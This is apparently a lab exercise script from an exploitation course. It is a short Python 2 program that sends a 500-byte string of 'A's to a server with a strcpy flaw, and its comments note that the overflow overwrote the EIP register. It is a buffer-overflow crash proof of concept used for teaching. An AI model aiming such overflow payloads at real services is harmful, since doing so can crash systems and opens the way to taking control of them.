#!/usr/bin/python

print "                 __                      "
print "                |__|____ ___  __         "
print "                |  \__  \\\\  \/ /       "
print "                |  |/ __ \\\\   /        "
print "            /\__|  (____  /\_/           "
print "            \______|    \/               "
print "                                         "

print	'Module 5'
print	'Exploitation Techniques'
print	'Part 1'
print

"""
Exploit basics
How to script using IDB as a platform

Strcpy - no cap on the length of the string

We will send large content to the server

Can connect with
nc 172.16.252.129 10000
"""

import socket
import sys

client_ip = sys.argv[1]
client_port = int(sys.argv[2]) # server listens on 10000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# takes IP address as a parameter
sock.connect((client_ip, client_port))

# buffer = 'A'*20 # ok
# buffer = 'A'*200 # ok
buffer = 'A'*500

# offset 41414141
# managed to corrupt the EIP register

sock.send(buffer) # send data
print sock.recv(1024) # print response

sock.close()

